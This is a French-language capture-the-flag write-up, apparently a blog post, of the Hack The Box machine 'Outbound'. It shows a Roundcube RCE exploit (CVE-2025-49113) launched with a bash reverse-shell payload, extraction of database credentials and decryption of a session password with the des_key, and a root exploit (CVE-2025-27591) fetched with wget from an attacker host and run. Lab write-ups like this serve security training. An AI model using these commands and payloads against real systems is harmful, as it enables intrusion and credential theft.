+++
draft = false
date = '2025-10-07T15:00:00+02:00'
title = "Hack The Box Outbound"
description = "Write Up du challenge OutBound"
authors = "Wanako"
tags = ["Hack The Box"]
categories = ["Machine", "Hack The Box", "CVE"]
+++

# Writeup - Outbound

## Reconnaissance

### Scan Nmap
```bash
nmap -A 10.10.11.77
```

**Résultats :**
- **Port 22/tcp** : SSH (OpenSSH 9.6p1)
- **Port 80/tcp** : HTTP (nginx 1.24.0) → Redirection vers `http://mail.outbound.htb/`

On ajoute le domaine au `/etc/hosts` :
```bash
echo "10.10.11.77 mail.outbound.htb" | sudo tee -a /etc/hosts
```

---

## Exploitation initiale

### CVE-2025-49113 (Roundcube Webmail)

Le site web héberge **Roundcube**, vulnérable à la **CVE-2025-49113** (RCE via file upload).

**Exploitation :**
```bash
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'nohup bash -i >& /dev/tcp/10.10.14.115/9099 0>&1 &'"
```

On obtient un **shell en tant que `www-data`**.

---

## Énumération post-exploitation

### Configuration Roundcube

Dans `/var/www/html/roundcube/config/config.inc.php` :
```php
mysql://roundcube:RCDBPass2025@localhost/roundcube
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

### Extraction des données MySQL

**Connexion à la base de données :**
```bash
mysql -u roundcube -pRCDBPass2025 roundcube
```

**Tables utiles :**
```sql
SELECT * FROM users;
```

| user_id | username | created             |
|---------|----------|---------------------|
| 1       | jacob    | 2025-06-07 13:55:18 |
| 2       | mel      | 2025-06-08 12:04:51 |
| 3       | tyler    | 2025-06-08 13:28:55 |

**Sessions actives :**
```sql
SELECT * FROM session WHERE sess_id = '6a5ktqih5uca6lj8vrmgh9v0oh';
```

Dans la session de **jacob**, on trouve le mot de passe chiffré :
```
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
```

### Déchiffrement du mot de passe

Roundcube utilise `des_key` pour chiffrer les mots de passe en session. On peut déchiffrer avec :
```php
<?php
$des_key = 'rcmail-!24ByteDESkey*Str';
$encrypted = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
echo rcube_utils::decrypt_passwd($encrypted, $des_key);
?>
```

**Mot de passe jacob :** `595mO8DmwGeD`

---

## Accès SSH en tant que jacob

```bash
ssh jacob@10.10.11.77
Password: 595mO8DmwGeD
```

### Enumération des mails de jacob

Dans ses mails, on trouve un **nouveau mot de passe** :
```
gY4Wr3a1evp4
```

---

## Escalade de privilèges

### Service vulnérable : CVE-2025-27591

Jacob utilise un service local vulnérable à **CVE-2025-27591** (privilege escalation).

**Exploitation :**

**Sur la machine attaquante :**
```bash
git clone https://github.com/BridgerAlderson/CVE-2025-27591-PoC.git
cd CVE-2025-27591-PoC
python3 -m http.server 80
```

**Sur la machine cible (en tant que jacob) :**
```bash
wget http://10.10.14.115/exploit.py
python3 exploit.py
```

L'exploit permet d'obtenir un **shell root**.

---

## Flags

**User flag :**
```bash
cat /home/jacob/user.txt
```

**Root flag :**
```bash
cat /root/root.txt
```

---

## Résumé

1. **Scan Nmap** → Roundcube sur port 80
2. **CVE-2025-49113** → RCE via upload → shell `www-data`
3. **Extraction MySQL** → Récupération des sessions et mots de passe chiffrés
4. **Déchiffrement** → Mot de passe jacob via `des_key`
5. **SSH jacob** → Énumération mails → nouveau mot de passe
6. **CVE-2025-27591** → Escalade de privilèges → root

---

**Machine pwned! 🚩**
